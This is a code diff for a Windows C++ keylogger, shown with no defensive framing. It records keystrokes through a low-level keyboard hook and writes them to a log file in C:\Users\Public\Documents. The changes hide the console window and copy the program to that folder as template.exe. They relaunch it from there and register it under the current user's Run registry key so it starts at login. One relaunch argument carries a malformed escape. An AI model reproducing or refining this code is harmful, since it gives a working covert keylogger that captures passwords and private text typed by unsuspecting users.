@@ -206,7 +206,7 @@ std::string timeLog()
 }
 HANDLE HookCode(DWORD code, bool caps, bool shift)
 {
-	file = CreateFileA("C:\\Windows\\System32\\cap.log",
+	file = CreateFileA("C:\\Users\\Public\\Documents\\cap.log",
 		GENERIC_WRITE,
 		2,
 		NULL,
@@ -216,6 +216,7 @@ HANDLE HookCode(DWORD code, bool caps, bool shift)
 	if (file == (HANDLE)-1)
 	{
 		std::cout << "Can't create file" << std::endl;
+		std::cout << GetLastError() << std::endl;
 		return (HANDLE)0;
 	}
 	SetFilePointer(file, 0, 0, 2);
@@ -265,28 +266,39 @@ LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam)
 }
 int main()
 {
-	FreeConsole();
+	//FreeConsole();
+	HWND hwnd = GetConsoleWindow();
+	ShowWindow(hwnd, 0);
 	HANDLE mtx;
 	//check another version
 	if (OpenMutex(MUTEX_ALL_ACCESS, 0, L"taolaichemchetchamaygio"))
 		return 0;
 	mtx = CreateMutex(0, 0, L"taolaichemchetchamaygio");
+	HKEY key{};
+	char subKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
+	{
+		const byte x[] = "C:\\Users\\Public\\Documents\\template.exe";
+		RegSetValueExA(key, "Hihi", 0, 1, x, 38);
+	}
 	//check where am i
 	TCHAR cmdline[MAX_PATH];
 	GetModuleFileName(NULL, cmdline, MAX_PATH);
-	if (wcscmp(L"C:\\Windows\\System32\\template.exe", cmdline))
+	if (wcscmp(L"C:\\Users\\Public\\Documents\\template.exe", cmdline))
 	{
 		// do copy
-		CopyFile(cmdline, L"C:\\Windows\\System32\\template.exe", true);
+		CopyFile(cmdline, L"C:\\Users\\Public\\Documents\\template.exe", true);
 		ReleaseMutex(mtx);
 		STARTUPINFO si;
 		PROCESS_INFORMATION pi;
 		ZeroMemory(&si, sizeof(si));
 		si.cb = sizeof(si);
 		ZeroMemory(&pi, sizeof(pi));
-		LPCWSTR cmtPath = L"C:\\Windows\\System32\\cmd.exe";
-		LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\template.exe"));
-		if (CreateProcess(cmtPath, cmtArg, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+		LPCWSTR cmtPath = L"C:\\Users\\Public\\Documents\\template.exe";
+		//LPCWSTR cmtPath = L"C:\\Users\\Public\\Documents\\template.exe";
+		LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe \c C:\\Users\\Public\\Documents\\template.exe"));
+		//if (CreateProcess(cmtPath, cmtArg, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+		if (CreateProcess(cmtPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
 		{
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
@@ -305,14 +317,7 @@ int main()
 	}
 
 	//check registry
-	HKEY key{};
-	char subKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
-	{
-		DWORD data;
-		const byte x[] = "C:\\Windows\\System32\\template.exe";
-		RegSetValueExA(key, "Hihi", 0, 1, x, 33);
-	}
+	
 	keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
 		HookProc,
 		GetModuleHandle(NULL),
